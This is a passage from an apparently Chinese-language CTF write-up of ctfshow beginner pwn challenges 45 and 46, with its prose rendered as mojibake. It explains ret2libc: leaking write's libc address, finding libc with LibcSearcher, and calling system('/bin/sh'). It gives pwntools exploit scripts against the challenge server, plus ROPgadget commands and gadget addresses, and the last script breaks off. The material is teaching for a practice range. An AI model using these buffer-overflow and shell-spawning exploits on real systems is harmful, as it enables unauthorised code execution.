</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_045">PWN_045
</h3><p>é¢˜ç›®ï¼š32ä½ æ—  system æ—  &ldquo;/bin/sh&rdquo;ã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/142.png"
	width="910"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/142_hu_82abb708cf1a0811.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/142_hu_f4f82383442791c4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="455"
		data-flex-basis="1092px"
	
></p>
<p>32ä½å…³é—­æ ˆä¿æŠ¤å…³é—­PIEã€‚</p>
<p>IDAåˆ†æmainï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/140.png"
	width="711"
	height="240"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/140_hu_175a81e93975ecf3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/140_hu_cd9361b7005e1aae.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="711px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/141.png"
	width="608"
	height="195"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/141_hu_c9fb5296e0aa6dc5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/141_hu_f7ef6bad6f31ddd8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="311"
		data-flex-basis="748px"
	
></p>
<p>è¿˜æ˜¯æ˜æ˜¾çš„æº¢å‡ºæ¼æ´äº†ï¼Œåªæ˜¯å…¶ä¸­çš„åç§»å˜äº†ï¼Œå¤§å·®ä¸å·®ï¼Œç°åœ¨æˆ‘ä»¬å…³å¿ƒçš„æ˜¯å¦‚ä½•å»æ‰¾åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„ä¸œè¥¿å‘¢ï¼Ÿç°åœ¨æ—¢æ²¡æœ‰systemï¼Œä¹Ÿæ²¡æœ‰â€œ/bin/shâ€</p>
<p>æ€è·¯ï¼šåœ°å€éšæœºåŒ–+NXä¿æŠ¤ç¦ç”¨ret2shellcodeï¼Œé‚£å°±æ˜¯æš—ç¤ºæˆ‘ç”¨ret2libcå’¯ï¼Œç”¨LibcSearcherè·å–å½“å‰libcç‰ˆæœ¬ï¼Œåˆ©ç”¨writeæ³„éœ²å‡ºwriteæœ¬èº«å‡½æ•°åœ°å€ï¼Œå†è·å–ç¨‹åºä¸­å› å¼€å¯NXä¿æŠ¤æ—¶åœ°å€éšæœºåŒ–çš„writeè™šæ‹Ÿåœ°å€ï¼Œä¸¤ä¸ªåœ°å€ç›¸å‡å¾—åˆ°åœ°å€åç§»é‡ï¼Œæ¥ç€å°±èƒ½åæ¨å‡ºsystemã€/bin/shçš„çœŸå®åœ°å€äº†ã€‚åœ¨æ­¤ä¹‹å‰è¦è®°å¾—å…ˆå¡«å……å¥½å˜é‡çš„ç¼“å†²åŒºã€‚</p>
<p>ä¸ŠåŠéƒ¨åˆ†exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28307</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;O.o?&#39;</span><span class="p">)</span>  <span class="c1">#ç­‰ç¨‹åºå‘é€è¿™å­—ç¬¦ä¸²å†å‘é€ç¬¬ä¸€ä»½payload</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ—¶å€™å·²ç»æŠŠwriteå‡½æ•°åœ°å€æ³„éœ²å‡ºæ¥äº†ï¼Œä¸è¿‡çœ‹åˆ°è¿™é‡Œæ¯”è¾ƒæ‡µé€¼å“ˆï¼Œpayloadä¸ºä»€ä¹ˆè¦ä¸Šä¼ è¿™ä¹ˆå¤šï¼Œç›´æ¥è°ƒç”¨writeå‡½æ•°ä¸è¡Œäº†å—ï¼Ÿè¿˜è¦gotã€pltå•¥çš„ï¼ˆå †pltã€gotä¸ç†Ÿæ‚‰çš„å¯ä»¥çœ‹å›<a class="link" href="https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot"  target="_blank" rel="noopener"
    >PWN-1ä¸­pltå’Œgotè¡¨çš„è®²è§£</a>ï¼‰ã€‚è®©æˆ‘ç»™ä½ ç»†åˆ†ä¸€ä¸‹ï¼šå…ˆè°ƒç”¨write_pltï¼Œè¿™æŒ‡writeå‡½æ•°çš„æ‰§è¡Œå…¥å£ï¼Œå‘Šè¯‰writeæˆ‘è¦ä½¿ç”¨ä½ äº†ï¼Œè°ƒç”¨writeåï¼Œä¼šä»æ ˆä¸Šè¯»å–è¿™ä¸ªåœ°å€ä½œä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ã€‚è¿™é‡ŒæŒ‡å®š main å‡½æ•°ï¼Œæ˜¯ä¸ºäº†è®©ç¨‹åºåœ¨æ³„éœ²åœ°å€åå›åˆ°ä¸»å‡½æ•°ï¼Œç»§ç»­æ¥æ”¶æˆ‘ä»¬çš„ç¬¬äºŒæ¬¡payloadï¼ˆç”¨äºåç»­è°ƒç”¨ system è·å– shellï¼‰ï¼Œé¿å…ç¨‹åºç›´æ¥é€€å‡ºã€‚ç¬¬ä¸€æ¬¡payloadæ˜¯è·å¾—writeåœ°å€ï¼Œç¬¬äºŒæ¬¡payloadæ˜¯æ‰§è¡Œsystemå‡½æ•°ã€‚</p>
<p>æ¥ç€åˆ°p32(1) + p32(write_got) + p32(4)ï¼šwrite å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/143.png"
	width="670"
	height="135"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/143_hu_f3c975e2df9b88f1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/143_hu_c713cca5ee6c652a.png 1024w"
	loading="lazy"
	
		alt="writeå‡½æ•°åŸå‹"
	
	
		class="gallery-image" 
		data-flex-grow="496"
		data-flex-basis="1191px"
	
></p>
<p>32 ä½ç¨‹åºä¸­å‚æ•°é€šè¿‡æ ˆä»å³å¾€å·¦ä¼ é€’ï¼Œå› æ­¤æ ˆä¸Šé¡ºåºä¸ºï¼š<code>fd</code> â†’ <code>buf</code> â†’ <code>n</code>ï¼Œä¹Ÿå°±æ˜¯ <code>write(1, write_got, 4)</code></p>
<p>æ¥ä¸‹åŠéƒ¨åˆ†exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span> <span class="c1">#ç”¨LibcSearcheræŸ¥è¯¢writeå¯¹åº”çš„libcå½“å‰ç‰ˆæœ¬</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>write = u32(io.recvuntil(&rsquo;\xf7&rsquo;)[-4:])è¿™ä¸€æ®µæ¯”è¾ƒé•¿ï¼Œåšè¿‡ä¹‹å‰é¢˜ç›®å¯¹æ­¤æœ‰ç‚¹å°è±¡ï¼Œä¸åº”è¯¥æ˜¯write = u32(io.recv(4))ï¼Ÿ</p>
<p>æ ¸å¿ƒåŸå› æ˜¯<strong>ç¨‹åºè¾“å‡ºä¸­å­˜åœ¨å¹²æ‰°ä¿¡æ¯ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥è¯»å–åˆ°çº¯å‡€çš„ 4 å­—èŠ‚åœ°å€</strong>ï¼Œä½ æ‰§è¡Œä¸€ä¸‹ç¨‹åºå°±çŸ¥é“äº†ï¼Œä¼šæœ‰â€œO.o?â€å†’å‡ºæ¥ï¼Œè¿™æ˜¯å¹²æ‰°ã€‚</p>
<p><code>io.recv(4)</code> æ˜¯æœ‰å±€é™æ€§çš„ï¼Œ<code>io.recv(4)</code> çš„ä½œç”¨æ˜¯<strong>ä»ç¨‹åºè¾“å‡ºä¸­è¯»å–å›ºå®šçš„ 4 å­—èŠ‚æ•°æ®</strong>ï¼Œä½†å®ƒæœ‰ä¸€ä¸ªä¸¥æ ¼å‰æï¼š<strong>ç¨‹åºå¿…é¡»åªè¾“å‡ºæˆ‘ä»¬éœ€è¦çš„ 4 å­—èŠ‚åœ°å€ï¼Œæ²¡æœ‰ä»»ä½•å¤šä½™å†…å®¹</strong>ï¼ˆå¦‚æç¤ºæ–‡æœ¬ã€æ¢è¡Œç¬¦ã€å…¶ä»–æ•°æ®ç­‰ï¼‰ã€‚æ­¤æ—¶recvç›´æ¥è¯»å–4ä¸ªå­—èŠ‚ï¼Œé‚£å°±ä¼šè¯»åˆ°O.o?çš„å­—èŠ‚å¯¼è‡´é”™è¯¯ã€‚</p>
<p><strong><code>recvuntil('\xf7')[-4:]</code></strong>ï¼šé€‚ç”¨äºç¨‹åºè¾“å‡ºå­˜åœ¨å¹²æ‰°ä¿¡æ¯ï¼Œä¸”åœ°å€ä»¥ <code>\xf7</code> å¼€å¤´ï¼ˆ32 ä½ libc å…¸å‹ç‰¹å¾ï¼‰çš„åœºæ™¯ï¼Œé€šè¿‡ç‰¹å¾å®šä½ + æˆªå–æ¥æå–æ­£ç¡®åœ°å€ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">8</span><span class="p">:])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_046">PWN_046
</h3><p>é¢˜ç›®ï¼š64ä½ æ—  system æ—  &ldquo;/bin/sh&rdquo;ã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/391.png"
	width="820"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/391_hu_c7ce958d597fd119.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/391_hu_f9459aaebd35dd94.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="410"
		data-flex-basis="984px"
	
></p>
<p>64ä½å…³é—­æ ˆä¿æŠ¤å…³é—­PIEã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/144.png"
	width="836"
	height="195"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/144_hu_cf5ef8ac764a5ada.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/144_hu_c486a541b03ac4d3.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="428"
		data-flex-basis="1028px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/145.png"
	width="838"
	height="145"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/145_hu_745994514c60a089.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/145_hu_de6931636b3f1092.png 1024w"
	loading="lazy"
	
		alt="è·Ÿè¿›ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="577"
		data-flex-basis="1387px"
	
></p>
<p>ç¡®å®æ˜¯<strong>64ä½ æ—  system æ—  &ldquo;/bin/sh&rdquo;</strong>ï¼Œå…¨å¾—è‡ªå·±æ„é€ ã€‚</p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯æ³„éœ²writeçœŸå®åœ°å€ï¼Œå¾—å‡ºlibcåŸºå€å’Œå¯¹åº”libcç‰ˆæœ¬ï¼Œå†åæ¨å‡ºä¸€äº›æ‰€éœ€çš„å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p>
<p>åœ¨æ­¤ä¹‹å‰éœ€è¦ä¸€äº›å¯„å­˜å™¨å¸®åŠ©ä¼ å‚ï¼Œå°±å¾—éœ€è¦ç”¨åˆ°ROPgadgetæŒ‡ä»¤æŸ¥è¯¢ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s1">&#39;ret|pop&#39;</span> <span class="p">|</span> grep <span class="s1">&#39;rdi&#39;</span>
</span></span><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s1">&#39;ret|pop&#39;</span> <span class="p">|</span> grep <span class="s1">&#39;rsi&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/392.png"
	width="1490"
	height="120"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/392_hu_4fbf721a8f0ef8c3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/392_hu_944a51fcd8cd1f44.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1241"
		data-flex-basis="2980px"
	
></p>
<p><code>0x0000000000400803 : pop rdi ; ret</code></p>
<p><code>0x0000000000400801 : pop rsi ; pop r15 ; ret</code></p>
<p>ä½†æ˜¯è¿™é‡Œçš„å¸¦rsiçš„gadgetä¸æ˜¯å•ç‹¬çš„ï¼Œè¿˜å¸¦æœ‰r15ï¼Œä¸è¿‡åœ¨è¿™é‡Œr15å¯„å­˜å™¨ç”¨ä¸ä¸Šï¼Œæˆ‘ä»¬åˆ°æ—¶å¾—ç”¨0å»è¦†ç›–å®ƒã€‚</p>
<p>payload1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> 
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400803</span>      <span class="c1">#0x0000000000400803 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15_ret</span> <span class="o">=</span> <span class="mh">0x400801</span>  <span class="c1">#0x0000000000400801 : pop rsi ; pop r15 ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;O.o?&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>writeå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªç”±å¯„å­˜å™¨rdiæ§åˆ¶ã€ç¬¬äºŒä¸ªç”±rsiæ§åˆ¶ï¼Œrdiå­˜å‚¨<code>1</code>ï¼Œrsiå­˜å‚¨<code>write_got</code>å› ä¸ºå¤šå‡ºä¸€ä¸ªr15å¯„å­˜å™¨æ‰€ä»¥ç»Ÿä¸€å­˜å‚¨æ— ç”¨å€¼<code>0</code>æ¶ˆé™¤å®ƒå¸¦ç»™ç¨‹åºçš„å½±å“ï¼Œæ¥ç€å†è¦†ç›–ä¸Šwrite@pltåœ°å€ï¼Œè°ƒç”¨writeå‡½æ•°ï¼Œå»æ³„éœ²writeçš„çœŸå®åœ°å€ã€‚</p>
<p>æ¥æ”¶writeå‡½æ•°çœŸå®åœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span><span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ°äº†payload2ï¼Œç”¨LibcSearcheræ¨¡å—å»æœç´¢å¾—åˆ°writeå‡½æ•°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œä»è€Œå¾—å‡ºåŸºå€ï¼Œæœ€ååæ¨å‡ºsystemå‡½æ•°çš„çœŸå®åœ°å€å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²çš„çœŸå®åœ°å€ï¼Œä»è€Œæ„é€ å‡ºåé—¨å‡½æ•°æ¥getshellã€‚</p>
<p>æœ€ç»ˆçš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28273</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> 
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400803</span>      <span class="c1">#0x0000000000400803 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15_ret</span> <span class="o">=</span> <span class="mh">0x400801</span>  <span class="c1">#0x0000000000400801 : pop rsi ; pop r15 ; ret</span>
